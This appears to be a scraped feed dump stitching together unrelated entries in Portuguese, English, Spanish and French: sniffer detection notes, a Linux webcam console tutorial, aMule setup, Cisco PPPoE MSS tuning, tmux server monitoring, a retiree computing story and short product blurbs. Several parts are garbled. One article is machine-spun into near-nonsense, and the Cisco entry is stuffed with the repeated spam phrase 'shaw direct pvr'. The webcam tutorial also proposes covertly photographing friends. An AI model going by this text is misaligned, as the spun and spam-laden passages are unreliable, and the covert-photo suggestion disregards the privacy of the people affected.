Em sistemas como Solaris, SCO e algumas versões do Irix, não existe indicação de modo promíscuo, não havendo, portanto, maneiras de detectar o uso do sniffer. 
Como o volume de informações que trafegam em uma rede tente a ser grande, grande também será o tamanho do log gerado pelo programa sniffer. Pacotes como o tigger tentam encontrar arquivos de log, com esta característica. 
É altamente recomendado o uso da ferramenta lsof para procurar arquivos de log e programas acessando dispositivos como o /dev/nit (no caso do SunOS). 
Não são conhecidos comandos para detectar um IBM PC compatível em modo promístuo. 
Sniffer são bem conhecidos tambem como nethacker.]]></summary>

  <summary><![CDATA[Today marks the second to the last day of Chanukah, and we've only got 10 more days until Christmas.  The past month or so has been very slow for me and open source.  I've been putting in a lot of hours at work, in preparation for our year-end code freeze, and haven't been doing a lot else.  My Slackware 14.0 computer has been performing well, and my wife's Xubuntu 12.04 setup is chugging along nicely (knock on wood!).  I haven't installed OpenBSD 5.2 yet... my other two desktop computers have been converted to Windows XP, for various reasons.  I've got a couple of fairly large projects that I *need* to do, but have been putting off for various reasons.  One of these is to take down my file server, clean it up and install Slackware 14.0 on it.  It has been running Slackware 13.1 for quite some time now.  I've been thinking about investing in a couple of 1TB drives and seeing if I can get them hooked up in a RAID1 configuration to give me a little more protection.  This would be the time, for sure.  Another task I want to work on is my Brewmeister program.  I started homebrewing beer earlier this year, and I enjoy it tremendously.  I started working on a Python program to assist me in this endeavor, but haven't made it very far, I'm afraid.  Once I do get rolling on it, I think I will open source it.  Stay tuned...  Anyway, this will probably be my last post before Christmas, although I'll probably post again before New Year's Day.  I hope everybody has a wonderful holiday season!]]></summary>

Undertaking architect can proactively get actions to reduce the gaps but removing it completely may not be feasible.  three)Introducing new need to the project without having next suitable Change Control Mechanism. Alter requests are one of the worthwhile resources in a undertaking. It requirements to be managed properly  Concern tracking through execution   We can only handle the bugs/issues by correct execution but we are unable to quit it totally. The crucial thing is to have a monitoring mechanism. When an issue takes place, the project supervisor increases the number of resources considering that there is no effective way to fix the issue other than rising the hrs. At that time there is no proper man or woman to identify the root trigger of the dilemma. Undertaking architect must own these issues in the undertaking. Performance is not providing pat in the again of the men and women. Performance is not creating a procedure and blindly adhering to that. Performance is distinguishing the proper process by properly examining the task and following it in a proper method.  Reactive and Proactive strategy for the undertaking.  Venture architect is a doer not a talker. They are not only a dilemma solver but a person who avoids problem. By defining a part as venture architect, we are introducing a individual to be liable for all the proactive and reactive elements of the venture. Undertaking architect will very own the government selection and identify ways to deal with in the appropriate way. Usually we outline task chief as man or woman to do items appropriate and venture supervisor to do correct factors. In a larger standpoint particular person who can do factors appropriate can only do appropriate things. So defining a function referred to as task architect, we are introducing a purpose just to do things correct and correct factors in a task.  Free of charge your enterprise from burdensome licensing fees  Switching to robust and secure desktop, notebook and server running techniques this sort of as Linux and OpenBSD that have zero licensing costs can have a quantity of other advantages in addition to the protecting on license fess. These advantages incorporate enhanced protection, high quality, customizability, expectations compliance and auditability.  Protection  Because, by very definition, the resource code is publicly accessible, it is wide open to any person to verify for stability vulnerabilities. Any stability vulnerabilities are typically swiftly recognized and rectified with Open up-Resource Software (OSS), whereas, with proprietary software package relatively number of individuals have accessibility to the resource code and it is typically not in the greatest passions of the seller to disclose any security weaknesses of their technique - they tend to stay hidden till they are unintentionally identified by users or actively discovered by crackers. Proprietary software program can also have concealed back-doors into your technique, whereas OSS can't conceal something.  Good quality  Due to the fact OSS jobs are likely to draw in several builders and the greatest code contributions are usually recognised, the top quality of OSS tends to be increased than proprietary software package jobs which commonly only have a handful of developers contributing to the code foundation. find out more]]></summary>

  <title><![CDATA[Linux webcam take pictures from tty console or terminal / How to make pictures of yourself using plain console and web-camera]]></title>
  <summary><![CDATA[I'm a great command line enthusiast, I share the believe of many other command line geeks thinking keyboard is the quickest way to access a computer. Historically keys were first and mouse second and I think there is definitely a good reason for that. Thus today I was curious if it is possible to take pictures from my external web-camera on my Debian GNU / Linux? I did a quick research and this little article springed out as result. 
	The answer is YES! It is possible and besides that there are many ways to take a webcamera picture using the console; Lastly it is very easy to achieve even for novice Linux buddies   My little research on the topic show me there are 4 straightforward ways one can use to use his extended or embedded WebCam to take pictuers – using (vlc, mplayer, camshot, fswebcam and ffmpeg). 

	1. Taking a webcam picture using vlc 
Invoke vlc with following arguments: 
	 # vlc -I dummy v4l2:///dev/video0 --video-filter scene --no-audio --scene-path /home/hipo --scene-prefix webcam-taken-picture-prefix --scene-format png vlc://quit --run-time=1   

	I've prepared a little wrapper script, for the sake of simplifying the long and hard to remember vlc options. Below is the script; 

	 #!/bin/sh 
	# This little script will take picture whilst in gnome-terminal / mlterm or any console tty 
	# As program uses vlc you need to have vlc properly configured and installed 
	# as well as the webcam video be properly working (detected by Linux kernel) 
	# licensed under GPLv2 script modified by hip0 14.12.2012 
	# Path where to store taken snapshots 
	STORE_PATH=/home/hipo 
	# Device locatation of webcam many webcams have default device in /dev/video0 
	WEBCAM_DEV=/dev/video0 
	# Stored grabbed picture filename prefix 
	FILE_NAME_PREF=image_prefix 
	# gets the current date and adds to set filename prefix 
	date_cur=$(date +%k_%d_%m_%Y|sed -e 's/^ *//'); 
	vlc -I dummy v4l2://$WEBCAM_DEV --video-filter scene --no-audio --scene-path $STORE_PATH --scene-prefix $FILE_NAME_PREF.$date_cur --scene-format png vlc://quit --run-time=1 
	echo "WebCam picture taken and stored in $STORE_PATH/$FILE_NAME_PREF.$date_cur*.png"; 
	echo ''; 
	echo "To view picture in Gnome with Eye of GNOME type: eog $STORE_PATH/$FILE_NAME_PREF.$date_cur*.png"; 
	  
	You can also download copy of the webcam_take_picture_from_console.sh script here. 
	As you see the script uses, vlc's (dummy interface), and –video-filter-scene option to make the snapshot. The script can be stored in let's say /usr/local/bin/webcam_take_picture.sh and aliased through ~/.bashrc with some short alias, i.e.: 
	 alias console-picture='/usr/local/bin/webcam_take_picture.sh' 
	Then at any time, when you run console-picture you will have a short way to make pictures of your room, your friends or whatever needed. One good application of script is whether you're in coffee with friends and you want to take a snapshot of them without them realizing (assuming, the webcam is embedded)   
Another great application is whether you want to take a snapshot of the WebCam, from another shell script or little application using dialog ncurses interfaces etc. 
	Even just for the sake of fun it is so nice to take a picture from webcam, whether in plain tty console bash shell   
One small note to make here is webcam_take_picture_from_console.sh should be run as non-root user (for security reasons vlc developers made smartly VLC this way), running it as root drops an err: 
>VLC is not supposed to be run as root. Sorry. 
	If you need to use real-time priorities and/or privileged TCP ports 
	you can use /usr/bin/vlc-wrapper (make sure it is Set-UID root and 
	cannot be run by non-trusted users first). 
	  
By default, vlc resolution used is the automatically set to the maximum supported to the camera, with mine this is 640×480 SRGB 
	The quality of pictures taken is a bit low but my camera is a cheap one and even with some GUI program snapshot taking programs like GNOME's cheese, taken pictures are with low quality (though I think the brightnes of the ones taken with vlc is a bit poorer than the ones done with cheese). 
	Happily it is possible to correct picture brightness and lightning with v42l-ctl (v42l-ctl is not installed by default and on Debian you will have to install deb pack v4l-utils), e.g.: 
	 apt-get install --yes v4l-utils 
	.... 
	  
	Further, check out the possible options available with: 
v4l2-ctl -L - (list all possible options)  
and to set a concrete option do: 
v4l2-ctl -c = (set an option) 
	  
I don't have a BSD (FreeBSD, NetBSD, OpenBSD) at hand, but with a working supported Webcam, correct location to the webcam /dev/  and installed VLC from ports : 
vlc -I dummy v4l2:///dev/video0--video-filter scene --no-audio --scene-path $STORE_PATH --scene-prefix $FILE_NAME_PREF.$date_cur --scene-format png vlc://quit --run-time=1 
	  
	should be working fine as well.  
	If someone has access to a BSD with a working installed webcam, please test it and drop a comment to confirm if working … 
2. Creating pictures from WebCamera using mplayer cmd 
	Theoretically mplayer, should be able to take snapshots from the Cam with: 
mplayer -vo png -frames 1 tv:// 
	  
	There is possibility to pass output webcam picture (resolution) dimensions too: 
	 
	 mplayer tv:// -tv driver=v4l:device=/dev/video0:width=320:height=240:outfmt=rgb24 -frames 1 -vo jpeg 
  
With my "NoName" (Eltron Technology) webcam the produced images were filled up with solid green color  (maybe due to bug of my webcam used driver). Normally it should be working; I've seen many posts around claiming using both of above cmd lines to produce pictures normally, but not for me. 

	3. Making pictures with WebCamera (camshot) console tool 
	I've seen around also another tiny tool (camshot) especially written to take pictures from webcam. The tool is available only to be compiled from source (whether source is fetched through Subversion repo (SVN)). I took a minute to test it as well, e.g.: 
  
hipo@noah:~Desktop$ svn checkout http://camshot.googlecode.com/svn/trunk/ camshot-read-only 
hipo@noah:~/Desktop/camshot-read-only$ make 
	.... 
	hipo@noah:~/Desktop/camshot-read-only$ ls 
	arguments.c  arguments.o  camera.h  camshot  image.h  main.c  Makefile  shmem.h  shmem_test.c 
	arguments.h  camera.c     camera.o  image.c  image.o  main.o  shmem.c   shmem.o 
	hipo@noah:~Desktop/camshot-read-only$ ./camshot  
	Letting the camera automaticaly adjust the picture:..........Done. 
	Command (h for help): h 
	Commands: 
	    x    Capture a picture from camera. 
	    h    Prints this help. 
	    q    Quits the program. 
	Command (h for help): x 
	Command (h for help): q 
  
Don't know why, but for me camshot did not produce, any output picture from webcam. Maybe my Webcam which is a cheap (all OS) compatible one is not detected fine by the tool? As you see from above help output there are not many options so it is definitely something with webcam detection or just it needs some kind of little "hack" in the source to make it working, I was lazy to further investigate so I leave it. 
	4. Making pictures from terminal using fswebcam 
	fswebcam is not so popular as vlc and mplayer, but is existent from default repostiries on both Debian and Ubuntu Linuces. Here is it how it is described when pkg info requested with apt-cache: 
apt-cache show fswebcam | grep -i descrip -A 8 
	Description: Tiny and flexible webcam program 
	 Fswebcam is a tiny and flexible webcam command-line program for capturing 
	 images from a V4L1/V4L2 device. It accepts a number of formats, can skip 
	 the first (possibly bad) frames before performing the actual capture, and 
	 can perform simple manipulation on the captured image, such as resizing, 
	 averaging multiple frames or overlaying a caption or an image. 
	Homepage: http://www.firestorm.cx/fswebcam/ 
	Tag: implemented-in::c, role::program 
	  
To use it first install it with apt-get or yum (yes it is available also for RedHat based Linux distros via yum). 
	Depending whether on Debian or Fedora etc. do: 
apt-get install --yes fswebcam  
	..... 
	 
or 

	 yum -y install fswebcam 
	.... 
	 

	fswebcam's syntax is much easier than all of rest cmd tools available around; to create picture from webcam; 
	 # fswebcam -r 640x480 --jpeg 85 -D 1 web-cam-shot.jpg 
	--- Opening /dev/video0... 
	Trying source module v4l2... 
	/dev/video0 opened. 
	No input was specified, using the first. 
	Delaying 1 seconds. 
	--- Capturing frame... 
	Captured frame in 0.00 seconds. 
	--- Processing captured image... 
	Setting output format to JPEG, quality 85 
	Unable to load font 'luxisr': Could not find/open font 
	Disabling the the banner. 
	Writing JPEG image to 'web-cam-shot.jpg'. 
	 
	I liked supports, saving in multiple formats, can set resolution and is probably the number 1 choice for anyone looking for high level of customization of cam taken picture.. Saying this I think fswebcam is definitely the tool of choice as it is written with the one and only aim to take webcam pictures from console. 
	5. Capturing picture from Webcam using ffmpeg 
With ffmpeg, there are plenty of things possible;  
	Just to mention few interesting ones, I've written about earlier, ffmeg is capable of; 
	- convert .OGG vorbis to MP3  
	- convert .FLV to .AVI and .AVI to .FLV 
	- convert .AVI .MP4 and .FLV to OGG Vorbis (Free Format) 
	- convert .OGG video to .FLV Video 
	- extract sounds / music from .FLV to a MP3 / MP4 
	- Add .SRT and .SUB files subtitles to Flash Videos 
Along with all this, interestingly ffmpeg can get content using command line from WebCamera (nomatter if it's a VIDEO stream or just a Picture snapshot). 
	The syntax to take a picture with it is: 
ffmpeg -f video4linux2 -i /dev/v4l/by-id/usb-Etron_Technology__Inc._USB2.0_Camera-video-index0 -vframes 1 output-picture.jpeg  
The precise /dev/(v4l – video 4 linux) assigned to different cameras will differ so in order to find what kind of /dev, to use ls it: 
# ls -al /dev/v4l/by-id/* 
lrwxrwxrwx 1 root root 12 Dec 14 22:40 /dev/v4l/by-id/usb-Etron_Technology__Inc._USB2.0_Camera-video-index0 -> ../../video0 
The picture resolution taken on my Eltron Technology Webcam is same like with vlc – the cam optimum 640×480, the quality and brightness gamma is also identical to pics taken using VLC.
 
Therefore if you're wondering if one tool, might make a better pictures from command line than the other the answer, according to my tests is they produce identical quality and all can be customized easily for different set of resolution. It is possible thought, this is not so with other Web Cam models, if you happen to read this post and take the time to try taking pictures with 5 methods and some of the 5 progs is making superior pictures, please drop a comment with the tool you used and the WebCam exact version as detected in dmesg or lsusb. 

	As a sort of Outtro, from purely functional / usability point of view I think fswebcam is probably be the tool of choice for mostly all as it is most simple, easily customizable and especially crafted for creating webcam console shots. That's all Enjoy, taking pics from GUI terminal or console   
P.S. – I know there are plenty of people who have written on the topic, so this article is nothing new under the sun, but as I couldn't find a post synthesizing in one all of the 5 methods I've come up with this little article. Feedback is mostly welcome
Happy picturing

  <summary><![CDATA[aMule es un programa de intercambio P2P libre y multiplataforma, similar al conocido eMule que funciona tanto con la red eDonkey como con Kademlia.Deriva del código fuente de xMule, el cual deriva del proyecto lMule, el primer intento de portar el cliente eMule a GNU/Linux. Al igual que eMule, aMule se distribuye y publica bajo los términos de la licencia GNU GPL.El objetivo de aMule es ser un "eMule multiplataforma", funcionando actualmente en los sistemas operativos GNU/Linux, FreeBSD, OpenBSD, NetBSD, Solaris, Mac OS X, Irix y Windows, y en las arquitecturas x86, AMD64, UltraSPARC, PowerPC, Macintosh (G4, G5,...), Xbox y NSLU2.Existen dos versiones de aMule, la versión estable, y la versión de desarrollo (SVN), que se publica diariamente con los últimos avances, aunque no se asegura su estabilidad. aMule admite también enlaces magnéticos. (Fuente Wikipedia)  Instalar aMule Para instalar aMule y funcione con Firefox debemos instalar dos paquetes:  amule: https://apps.ubuntu.com/cat/applications/amule/ amule-utils: https://apps.ubuntu.com/cat/applications/amule-utils/  o desde la linea de comandos  apt-get install amule amule-utils  Enlazarlo con Firefox A mi es una de las cosas que siempre que instalo un Ubuntu de 0 me pasa, que tengo que enlazar el Firefox con los enlaces de amule. Y no es intuitivo activarlo.. has de saber donde tocar y que poner. La manera rápida y efectiva que yo tengo de hacerlo es así:  Tecleamos en la barra de dirección de Firefox about:config. Veremos una pantalla así:    Le damos al botón que nos hace prometer que tendremos cuidado y luego podemos configurarlo:  Mediante el botón derecho tenemos que incluir 4 valores, 3 lógicos y uno de cadena:    Tipo: Logico  network.protocol-handler.external.ed2k   valor: TRUE  Tipo: Logico network.protocol-handler.warn-external.ed2k   valor: FALSE  Tipo: Logico network.protocol-handler.expose.ed2k       valor: FALSE    Tipo Cadena network.protocol-handler.app.ed2k   valor: /urs/bin/amule   Una vez hecho esto reiniciamos el Firefox y ya nos funcionaran los enlaces.]]></summary>

  <title><![CDATA[Credit card acceptance]]></title>
  <summary><![CDATA[Debit and credit card acceptance is becoming pretty standard business practice across the UK at the moment.  The demand for new forms of payment instead of cash and cheques has increased for a variety of reasons and now accepting cards applies to virtually every business you could possibly imagine.
 There was a time when accepting cards would have been very strange indeed, and then using them to guarantee a cheque payment seems even more bizarre now when you can simply used the card.  Since cheques are all but outdated now, there is little left for the consumer other than the debit and credit card.
 How do I accept credit cards and debit cards?
 Accepting cards has never been easier either, now that there are plenty of independent payment processors out there willing to compete for you business.  If you have an SME (small or medium sized enterprise) then you should ideally be looking at accepting cards, if not now, then at least in the very near future.
 If you want your business to begin accepting cards then the first thing you need to do is contact an independent payment processor to get a free quotation.  They should be able to tell you: how much it costs to set up (if anything), how long it takes, and how much they’re going to charge you to accept credit cards and debit cards etc.  We would strongly advise you to get as many quotes as you can before you commit to making a decision.
 Conclusion
 The future of payments is indeed card acceptance, and basically if you don’t have the tools in which to do so, you do risk being left behind whilst other businesses, and more importantly your competition, get a lot more attention.  Card acceptance is standard practice, be a part of it.

  <summary><![CDATA[Installing  KVM Guests With virt-install On Ubuntu 12.10 Server 
  Unlike virt-manager,  virt-install is a command line tools that allows you to create KVM  guests on a headless server. You may ask yourself: "But I can use vmbuilder  to do this, why do I need virt-install?" The difference between  virt-install and vmbuilder is that vmbuilder is for creating  Ubuntu-based guests, whereas virt-install lets you install all kinds of  operating systems (e.g. Linux, Windows, Solaris, FreeBSD, OpenBSD) and  distributions in a guest, just like virt-manager. This article shows how  you can use it on an Ubuntu 12.10 KVM server.

  <summary><![CDATA[After you configure a Cisco router to authenticate to a provider using PPPoE (later put how to do that here too) many people can not browse "the internet". A possible, and most likely cause of this problem is to limit the maximum size of the MRU (maximum-receive-unit) shaw direct pvr defined in RFC2516 shaw direct pvr as 1492 bytes. As the MTU (maximum transmission unit) of ethernet segments is usually shaw direct pvr set to 1500 bytes, a standard ethernet packet will not travel on the PPPoE link, ie, between the CPE (customer premises equipement) and aggregator (equipment            provider that makes termination PPPoE connection, also known as BRAS - Broadband Remote Access Server). shaw direct pvr For more details of the architecture of the xDSL / PPPoE consult this document. Thus, even if their requests are able to traverse your internal network to the Internet through the link your PPPoE (MTU less than 1492 bytes) is very likely that the answers shaw direct            pvr to their requests in return packets larger shaw direct pvr than this size and equipment aggregator of your carrier will discard the answers, assemble and send ICMP packets informing the source (in this case the server) packages that exceeded the maximum size allowed in the segment. If the administrator shaw direct pvr Firewall (before the server) or the administrator of the server itself configured a lock for all ICMP messages to the destination server, then the connection shaw direct pvr will not work because the server            does not know to adjust the size of the packets that they are not dropped on your way back. To work around this problem in Cisco routers, there is a command that can be used to adjust shaw direct pvr the field MSS (maximum segment size) of the TCP header, allowing the server is informed of the maximum size (MTU) of messages accepted for certain segment. For this, we use the command "ip tcp adjust-mss shaw direct pvr 1492" on the internal interface of the network.

  <title><![CDATA[Les anciens]]></title>
  <summary><![CDATA[Mes parents ont 160 ans à eux deux. Ils sont encore en bonne santé et toujours curieux d'apprendre. Ils vivent une retraite paisible dans le nord de la France, près de Lille.  Seulement voilà, Lille, c'est un peu loin de là où j'habite, et malgré leur appel téléphonique hebdomadaire, j'apprécie de les voir de visu de temps en temps, au moment des vacances par exemple. Mais c'est trop peu...  Ils ont travaillé toute leur vie sans avoir à utiliser un ordinateur. Ils ont pris leur retraite d'instituteurs avant que le plan "informatique pour tous" n'atteigne leurs établissements respectifs, même s'ils ont un peu tâté du "Télé Ordinateur n°7" et du "Micro-Ordinateur n°5" pendant que de mon côté je lisais avec passion "Micro et Robots".  Mais maintenant que même les appareils photos sont numériques, que les films pour caméras Super 8 sont introuvables, il a bien fallu qu'ils se rendent à l'évidence : s'ils voulaient garder un peu le contact avec leurs petits enfants, il leur fallait réagir.  Ils se sont donc inscrits à un cour d'informatique dans la médiathèque de la ville où ils habitent. Et pendant plusieurs mois, à raison de deux séances par semaine, ils ont découvert le monde numérique avec patience et persévérance.  "Bon alors, la souris, c'est ça. Et quand on la déplace à droite, vous voyez une petite flèche se déplacer à droite également. Non, Monsieur Truc, vous tenez la souris dans le mauvais sens, le fil doit s'écarter de vous par le haut. Oui, Madame Bidule, c'est bien, mais il ne faut pas appuyer sur les boutons, en tout cas pas maintenant..."  Mes parents m'ont un peu raconté les débuts hésitants du groupe d'anciens auquel ils appartenaient. Ils ne m'ont pas tout raconté car ils ont la pudeur des parents qui ont tout appris à leurs enfants. Puis un jour, ils m'ont annoncé qu'ils avaient envie maintenant d'avoir internet à la maison, qu'ils se sentaient assez sur d'eux pour pouvoir envoyer des emails à leurs petits enfants depuis chez eux, et non plus depuis la médiathèque.  Me voici donc chargé d'une mission délicate: informatiser mes parents à distance (plus de 600 km). Si un jour vous avez à gérer la même problématique, je vous livre ici la solution que j'ai choisie. Ce n'est pas nécessairement celle que vous auriez choisie, mais c'est un retour d'expérience. N'hésitez pas à faire part de vos propres retours en commentaires.  1ère étape: internet.  Je suis un vieux fan du FAI Free, malgré ses défauts. Mais j'ai conscience que, si j'arrive à maîtriser les reboots de la box quand la ligne n'est plus synchronisée, ou faire la part des choses entre France Telecom et Free (je ne suis pas dégroupé pour conserver l'usage fiable d'un fax professionnel indispensable à l'activité de mon épouse), je ne souhaitais pas rendre les choses compliquées pour mes parents.  Donc, après avoir réfléchi à la possibilité de dégrouper leur ligne, résilier leur abonnement de portable hors de prix avec portabilité de leur numéro, pour tout prendre chez Free, j'ai finalement choisi la solution raisonnable: l'offre internet la moins chère de l'opérateur historique, Orange "Découverte sans engagement" à 21 euros par mois.  Ils conservent donc leur ligne de téléphone qui leur coûte un bras, leur abonnement mobile orange qui leur coûte l'autre bras, leur télévision TNT qui fonctionne très bien avec déjà beaucoup de chaînes et leur magnétoscope à cassette qui fonctionne toujours et dont mon père arrive maintenant à maîtriser à peu près correctement les fonctionnalités.  Donc, pas de dégroupage, pas de téléphone gratuit, pas 200 chaînes, pas de magnétoscope numérique avec pause possible du direct, pas de mobile tethering, mais un système supplémentaire acheté en boutique et installé sur place par un technicien orange. Cela faisait partie du cahier des charges.  2ème étape: l'ordinateur.  Pendant des mois, j'ai cherché sur internet une distribution GNU/Linu, FreeBSD, NetBSD, OpenBSD ou OpenSolaris adaptée à l'usage des seniors: un bureau avec quelques gros boutons pour aller sur internet, lire ses emails, regarder ses photos. Mais il m'a bien fallu me rendre à l'évidence, rien d'immédiatement opérationnel n'existe de vraiment adapté. Ou en tout cas, je n'ai pas trouvé.  J'ai regardé du côté d'Apple pour voir si sa tablette iPad pouvait satisfaire les besoins exprimés par mes parents, mais j'ai hésité devant le côté un peu fragile du concept. Quand je vois l'état de leurs différentes zapettes rafistolées avec des élastiques...  Et puis, quand mes parents m'ont annoncé qu'ils suivaient une formation, je leur ai demandé de me décrire un peu l'environnement informatique qu'ils utilisaient et j'ai reconnu un classique Windows XP. Je n'ai donc pas cherché à perturber leur apprentissage et j'ai commencé à chercher un ordinateur sous Windows (je sais, Microsoft, c'est le mal...) qui pourrait bien leur convenir.  Cahier des charges: livraison chez mes parents, facile à installer, sans trop de câbles partout, écran assez grand, équipé de Windows, d'une carte Wifi pour raccordement à la LiveBox et prix raisonnable. J'ai trouvé mon bonheur chez Dell avec un "tout en un" Inspiron one 2320 Essentiel, avec écran tactile 23",  à 600 euros ttc livraison comprise. Pas de problème avec les fils, écran géant, webcam incorporée. Bref, une tablette géante.  3ème étape: la configuration.  Une fois l'ordinateur livré, j'avais comme unique objectif l'installation du logiciel gratuit de prise de contrôle à distance LogMeIn. Comptez quand même une bonne heure au téléphone à aider à la procédure complète de démarrage de l'ordinateur jusqu'à avoir enfin le contrôle de la souris et un retour d'écran sur mon propre ordinateur à 600 km de là.  Après, c'est le bonheur: vous avez le contrôle total de la machine avec LogMeIn. Vous pouvez donc tranquillement nettoyer l'ordinateur de tous les logiciels inutiles préinstallés en version d'essai, mettre un antivirus (Microsoft Security Essentials, je sais Microsoft, c'est le mal...), mettre à jour tous les produits (Java, Flash, Acrobat, Windows, etc), installer un navigateur digne de ce nom (Firefox avec AdblockPlus), installer Skype (je sais, Microsoft, c'est le mal...), etc.  Depuis, chaque dimanche, mes parents organisent avec mes enfants une petite visio Skype depuis leur salon, pour le plus grand bonheur de tous. Je peux enfin les voir tous les week-ends. Et chaque dimanche, je discute avec eux et je règle leurs petits problèmes informatiques. Qui a dit que les anciens étaient réfractaires à l'informatique ?  La dernière fois, j'ai découvert que leur ordinateur restait allumé en permanence car ils ne savaient qu'éteindre l'écran. Le formateur de la médiathèque ne leur avait jamais montré comment éteindre un ordinateur, puisque les postes étaient utilisés jusqu'au soir par différents groupes. Mes parents m'ont fait rire en découvrant la procédure d'extinction d'un PC Windows7: "Mais pourquoi faut-il appuyer sur le bouton "démarrer" pour éteindre l'ordinateur ?"  L'ordinateur a ses raisons que la raison ignore.  Prochaine étape, Facebook...]]></summary>

  <title><![CDATA[Monitoring your server with tmux]]></title>
  <summary><![CDATA[Follow @LinuxUserMag 
There are lots of systems and utilities available to monitor your system. Many of these are web-based, or they run as a client-server system. 
Unfortunately, there are several instances where the only allowed connection to the server of interest is over SSH. This might be for several reasons, the least of which being security. In these cases, you will likely still want some way of easily monitoring what is going on with your server. Using tmux, you can create a session which will run all of your monitoring software and 
keep it running, regardless of whether you lose your connection or not. 
This article will cover the basics of creating such a session, which you should be able to tune and tweak to fit your specific requirements. This way, you can simply log in using any available SSH connection and see, in an instant, all of the information that is of interest to you. Also, since you need to log into the system over SSH, you don’t need to worry about the problems of locking down other software, such as a web server. 
You can monitor a lot of processes and logs with tmux
Resources
tmux 
Launchpad 
Step by Step
Step 01
 Getting tmux 
Tmux originated as part of the OpenBSD system. It should be available in most distributions. For example, you can get it in Ubuntu with ‘sudo apt-get install tmux’. If you need the latest and greatest features, you can download the source code from SourceForge. 
Step 02
 Building tmux 
The build system uses the usual ‘./configure; make; make install’ steps to build tmux. The reason you may want to build your own is that many distributions are behind one or more versions on the software provided by their respective repositories. 
Step 03
 Starting tmux 
Starting tmux is as simple as typing ‘tmux’ and hitting Enter. Your console will clear for a split second, and then you will be presented with a Bash prompt again, along with a status bar located at the bottom of your screen. This status bar will contain information about your current tmux session. 
Step 04
 Starting top – CPU sorted 
One of the things you will be interested in monitoring is which processes are using up the most CPU cycles on your server. A good tool for this is ‘top’. The default when you first start it is to sort processes based on CPU usage, so that is fine. 
Step 05
 Getting a new window 
Here we come to one of the features of tmux; we need to create a new window in this tmux session. There are two ways to handle this: first, you can use the shortcut ‘C-b c’, or you can enter the complete command ‘new-window’. To enter commands, you need to enter ‘C-b :’ and then the command. This will put your current window into the background and open a new window in the foreground. 
Step 06
 Starting top – memory sorted 

					
						
					With a new window, you can start a new instance of top, sorting it on some other criteria. One of interest to most system administrators is which processes are using up memory. To sort the processes in this way, you will need to enter ‘M’. This may vary for other versions of top, so always check your version’s man page. You might also want to change the refresh rate by entering ‘d’ and setting the number seconds between each display. 
Steo 07
 Navigating windows 
Now that you have multiple windows, you need to be able to navigate between them. The simplest way is to use the shortcut navigation keys. To move to a specific window, you can use ‘C-b’ and then the window number. Remember that window numbering starts at 0. If you simply want to move to the next or previous window, use ‘C-b n’ or ‘C-b p’. 
Step 08
 Creating new panes 
The next great feature of tmux is the ability to break up windows into panes. This lets you have multiple programs running in the same window. To split the current pane horizontally, use ‘C-b %’ to get two panes, left and right. If you wish to split the current pane vertically, you would use ‘C-b “’. 
Step 09
 Navigating panes 
Once you end up with multiple panes, you need to be able to navigate them. To move to the next pane in the current window, you would use the shortcut ‘C-b o’. 
You can also rearrange panes within a window. To swap the current pane with the previous pane, use the ‘C-b {’ keyboard shortcut. To do so with the next pane, use ‘C-b }’. 
Step 10
 Using tail 
Now that you have tmux essentials under your belt, it’s time to add some systems monitoring. You’ll want to monitor system logs, and you can do so in multiple panes, giving you an overall view. For example, navigate to an empty pane and enter: 
tail -f /var/log/syslog
…in order to get a continually updating view of system messages. 
Step 11
 Following dmesg 
Kernel messages can be followed by using the program dmesg. The problem is that it doesn’t do automatic refreshing. You can accomplish this with ‘watch -n 3 “dmesg | tail -n 15” ’, where the 3 is the number of seconds between refreshes, and the 15 is the number of lines to display. 
Step 12
 Network statistics 
The next area you will want to monitor is networking. One utility you can use is netstat. To see all of the current connections on your server, you can use ‘netstat -at | grep -v LISTEN’. This is non-refreshing, so again you will likely want to pass it to watch in order to get an updating output.

  <title><![CDATA[What Are the Advantages of a Netbook?]]></title>
  <summary><![CDATA[Netbooks are very light, small-sized laptop computers that are mainly used for browsing the web, shopping online, chatting and using the social networks. Many of the sites offering netbook reviews speak highly about them and they are becoming more and more popular. Mostly, this happened because of a series of advantages that attracted the public right away: 




Advantage no.1: Size 
 The small-sized netbook is always good to go anywhere you go. You can put it in your office briefcase, in your backpack when you go on a holiday or in a bag, if you want to take a walk. Practically, it fits anywhere, thanks to its special design, with a 7 to 12 inch screen, that takes up little room, but gives you good quality. 
Advantage no. 2: Weight 
 A netbook weighs 2.9 lbs., therefore you can carry it around without feeling you're actually carrying weight. It is light enough to be carried by children, by old people and also by the ones who usually have many and/or heavy thing on them and need a light computer. 
  
  What Are the Advantages of a Netbook?


Advantage no. 3: Battery
 As it is designed for people who mainly browse the web, the battery is 3-4 cells or even 6 cells, on the newest models, so as to stay connected for up to 8 hours. Advantage no. 4: Operating systems 
 A netbook can operate any system you regularly find a personal computer: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin. Advantage no. 5: Storage 
 Equipped with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you want while browsing the web. Advantage no. 6: Keyboard 
 Being as small as it is, the netbook raises the keyboard issue: Is it cramped? Does it slow you down? The truth is that, at the beginning, the keyboard was nearly 80% of a laptop keyboard and it created a few difficulties in typing. Now you can find the improved models on the market, with bigger keyboards, that are 92% of a regular laptop's and allow you to type fast and easily. Advantage no. 7: Price
 Last, but not least, one of the main advantages that the netbook has to offer is its low price. Judging by the quality it offers, it's a great deal for any user. So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. And also there's no wonder more and more people are trading their every day laptop for a smaller, cheaper, better netbook, don't you think?

  <summary><![CDATA[Drupal é uma plataforma de software livre e "open source", funcionando na prática como um framework e um Sistema de Gestão de Conteúdos(CMS- Content Management System) programado em línguagem PHP.Tal como todos os modernos CMS, o Drupal permite que um administrador possa facilmente gerir todo um site, desde a organização de conteúdos, de utilizadores, permissões, menus, aspecto gráfico, etc.O Drupal consegue com facilidade colocar um utilizador comum a criar e gerir um site, sem necessidade de programar, mas também permite ampliar as funcionalidades, adicionando módulos que a comunidade desenvolve para este CMS, ou acrescentar código em PHP utilizando uma série de serviços e transações existentes no núcleo do CMS. Este tipo de abordagem coloca ao dispor do administrador a possibilidade de fazer crescer o seu site até onde a imaginação e a capacidade técnica lhe deixarem.O Drupal pode ser executado em ambiente Windows, Mac OS X, Linux, FreeBSD, OpenBSD, Solaris 10, OpenSolaris e muitas outras plataformas desde que suportem Apache ou IIS, linguagem PHP e base de dados MySQL ou PostgreSQL.]]></summary>

  <title><![CDATA[OPERACIJSKI SISTEM]]></title>
